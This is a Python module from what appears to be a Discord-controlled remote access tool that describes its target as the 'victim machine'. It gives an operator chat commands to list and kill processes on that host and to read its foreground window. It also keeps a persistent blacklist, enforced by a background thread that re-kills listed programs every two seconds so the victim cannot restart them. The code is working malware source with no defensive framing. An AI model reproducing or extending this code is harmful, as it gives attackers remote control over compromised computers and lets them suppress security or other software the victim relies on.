"""Inspect and control the processes that run on the victim machine.

The module also keeps a blacklist of process names. Every process on that
list is killed again as soon as it starts, so a program that is restarted
by the victim does not come back.
"""

import asyncio
import ctypes
import json
import threading
from collections.abc import Callable
from pathlib import Path

import psutil
from discord.ext import commands
from discord.ext.commands import Context

from src.utils.utils import send_text_in_chunks, state_file

# File that holds the blacklisted process names.
PROCESS_BLACKLIST_FILE = "process_blacklist.json"

# Seconds between two runs of the blacklister.
BLACKLIST_INTERVAL = 2.0

# The processes of the last listing, used by the kill command.
last_process_list: list[str] = []

# The function that reports the killed processes to the chat.
_kill_reporter: Callable[[str], None] | None = None

# The thread that watches the blacklist.
_killer: threading.Thread | None = None
_killer_stop = threading.Event()


def set_kill_reporter(reporter: Callable[[str], None] | None) -> None:
    """Set the function that reports killed processes to the chat."""
    global _kill_reporter
    _kill_reporter = reporter


def report(message: str) -> None:
    """Send a message about the blacklister to the chat."""
    if _kill_reporter is None:
        print(message)
        return

    try:
        _kill_reporter(message)
    except Exception as exc:
        print(f"Could not report the killed process: {exc}")


def blacklist_path() -> Path:
    """Return the path of the file that holds the blacklisted processes."""
    return state_file(PROCESS_BLACKLIST_FILE)


def read_blacklist(path: Path | None = None) -> list[str]:
    """Read the blacklisted process names."""
    target = path or blacklist_path()

    try:
        raw = json.loads(target.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return []

    if not isinstance(raw, list):
        return []

    return [name for name in raw if isinstance(name, str) and name]


def write_blacklist(names: list[str], path: Path | None = None) -> None:
    """Write the blacklisted process names."""
    target = path or blacklist_path()
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(json.dumps(names, indent=2), encoding="utf-8")


def running_process_names() -> list[str]:
    """Return the names of the processes that currently run."""
    names: list[str] = []

    for proc in psutil.process_iter(["name"]):
        try:
            name = proc.info.get("name")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

        if name:
            names.append(name)

    return names


def build_process_list() -> list[str]:
    """Return the running processes, sorted and with their instance count."""
    names = sorted(running_process_names(), key=str.casefold)
    result: list[str] = []
    count = 0
    current = ""

    for name in names:
        if name == current:
            count += 1
            continue

        if current:
            result.append(f"{current}   [x{count}]" if count > 1 else current)

        current = name
        count = 1

    if current:
        result.append(f"{current}   [x{count}]" if count > 1 else current)

    return result


def kill_by_name(name: str) -> list[str]:
    """Kill every process with that name and return the killed names."""
    killed: list[str] = []

    for proc in psutil.process_iter(["name"]):
        try:
            if (proc.info.get("name") or "").casefold() != name.casefold():
                continue

            proc.kill()
            killed.append(proc.info.get("name") or name)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

    return killed


def foreground_process_name() -> str | None:
    """Return the name of the process that owns the foreground window."""
    try:
        handle = ctypes.windll.user32.GetForegroundWindow()
        process_id = ctypes.c_ulong()
        ctypes.windll.user32.GetWindowThreadProcessId(
            handle, ctypes.byref(process_id)
        )
        return psutil.Process(process_id.value).name()
    except Exception:
        return None


def start_blacklister() -> None:
    """Start the thread that kills the blacklisted processes."""
    global _killer

    if _killer is not None and _killer.is_alive():
        return

    _killer_stop.clear()
    _killer = threading.Thread(target=_blacklist_loop, daemon=True)
    _killer.start()


def stop_blacklister() -> None:
    """Stop the thread that kills the blacklisted processes."""
    _killer_stop.set()


def _blacklist_loop() -> None:
    """Kill the blacklisted processes until the bot stops."""
    while not _killer_stop.wait(BLACKLIST_INTERVAL):
        for name in read_blacklist():
            try:
                killed = kill_by_name(name)
            except Exception as exc:
                print(f"Blacklister error: {exc}")
                continue

            if killed:
                report(f"Process blacklister killed `{name}`.")


async def show_processes(ctx: Context[commands.Bot]) -> None:
    """List the processes that run on the victim machine."""
    global last_process_list

    processes = await asyncio.to_thread(build_process_list)
    last_process_list = processes

    if not processes:
        await ctx.reply("No process is running.")
        return

    lines = [
        f"**{index})** {name}" for index, name in enumerate(processes, start=1)
    ]

    header = f"**{len(processes)}** distinct processes are running.\n"

    await send_text_in_chunks(ctx, header + "\n".join(lines), filename="processes.txt")


async def kill_process(ctx: Context[commands.Bot], target: str) -> None:
    """Kill a process by name or by the number of the last listing."""
    target = target.strip()

    if not target:
        await ctx.reply("Usage: `!kill <process-name>` or `!kill <number>`")
        return

    # A number refers to the listing that was made last.
    if target.isdigit() and last_process_list:
        number = int(target)

        if number < 1 or number > len(last_process_list):
            await ctx.reply(
                f"There is no process with that number, the list has "
                f"{len(last_process_list)} entries. Use `!ps` to see them."
            )
            return

        name = last_process_list[number - 1].split("   [")[0]
    else:
        name = target

    running = await asyncio.to_thread(running_process_names)

    if name.casefold() not in [item.casefold() for item in running]:
        await ctx.reply(f"No process named `{name}` is running.")
        return

    killed = await asyncio.to_thread(kill_by_name, name)

    if not killed:
        await ctx.reply(f"Could not kill `{name}`.")
        return

    await ctx.reply(f"Killed {len(killed)} process(es) named `{name}`.")


async def show_foreground(ctx: Context[commands.Bot]) -> None:
    """Show the process that owns the foreground window."""
    name = await asyncio.to_thread(foreground_process_name)

    if not name:
        await ctx.reply("Could not read the foreground window.")
        return

    await ctx.reply(f"The foreground window belongs to `{name}`.")


async def blacklist_process(ctx: Context[commands.Bot], name: str) -> None:
    """Add a process name to the blacklist."""
    name = name.strip()

    if not name:
        await ctx.reply("Usage: `!blacklist <process-name>`")
        return

    names = await asyncio.to_thread(read_blacklist)

    if name.casefold() in [item.casefold() for item in names]:
        await ctx.reply(f"`{name}` is already blacklisted.")
        return

    names.append(name)

    try:
        await asyncio.to_thread(write_blacklist, names)
    except OSError as exc:
        await ctx.reply(f"Could not write the blacklist: {exc}")
        return

    await asyncio.to_thread(start_blacklister)

    await ctx.reply(f"`{name}` is blacklisted and will be killed again when it starts.")


async def whitelist_process(ctx: Context[commands.Bot], name: str) -> None:
    """Remove a process name from the blacklist."""
    name = name.strip()

    if not name:
        await ctx.reply("Usage: `!whitelist <process-name>`")
        return

    names = await asyncio.to_thread(read_blacklist)

    if name.casefold() not in [item.casefold() for item in names]:
        await ctx.reply(f"`{name}` is not blacklisted.")
        return

    names = [item for item in names if item.casefold() != name.casefold()]

    try:
        await asyncio.to_thread(write_blacklist, names)
    except OSError as exc:
        await ctx.reply(f"Could not write the blacklist: {exc}")
        return

    await ctx.reply(f"`{name}` is no longer blacklisted.")


async def list_blacklist(ctx: Context[commands.Bot]) -> None:
    """Show the blacklisted process names."""
    names = await asyncio.to_thread(read_blacklist)

    if not names:
        await ctx.reply("The process blacklist is empty.")
        return

    await ctx.reply("Blacklisted processes: " + ", ".join(f"`{name}`" for name in names))


def start_process_watchers() -> None:
    """Start the blacklister when the blacklist already holds entries."""
    if read_blacklist():
        start_blacklister()
